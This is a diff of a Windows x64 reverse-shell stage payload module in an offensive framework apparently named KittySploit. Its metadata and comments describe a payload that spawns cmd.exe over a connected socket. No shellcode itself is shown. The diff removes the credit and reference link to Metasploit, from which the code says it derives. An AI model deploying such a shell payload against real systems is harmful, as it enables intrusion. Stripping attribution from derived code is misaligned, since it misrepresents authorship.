@@ -11,7 +11,7 @@ class Module(Payload):
     __info__ = {
         'name': 'Windows x64 Command Shell Stage',
         'description': 'Windows x64 shell stage - expects socket handle to be connected (staged)',
-        'author': 'KittySploit Team (based on Metasploit module)',
+        'author': 'KittySploit Team',
         'version': '1.0.0',
         'category': 'singles',
         'arch': Arch.X64,
@@ -19,9 +19,6 @@ class Module(Payload):
         'listener': 'listeners/multi/reverse_tcp',
         'handler': Handler.REVERSE,
         'session_type': SessionType.SHELL,
-        'references': [
-            'https://github.com/rapid7/metasploit-framework'
-        ]
     }
     
     lhost = OptString('127.0.0.1', 'Connect to IP address', True)
@@ -47,7 +44,7 @@ class Module(Payload):
         
         # Windows x64 shell stage shellcode
         # This shellcode duplicates the socket handle and spawns cmd.exe
-        # Based on Metasploit Windows x64 shell/reverse_tcp stage
+        # Windows x64 shell/reverse_tcp stage layout
         
         # Block 1: Get socket handle and duplicate to stdin/stdout/stderr
         # The socket handle is expected to be in RDI (or passed via stack)
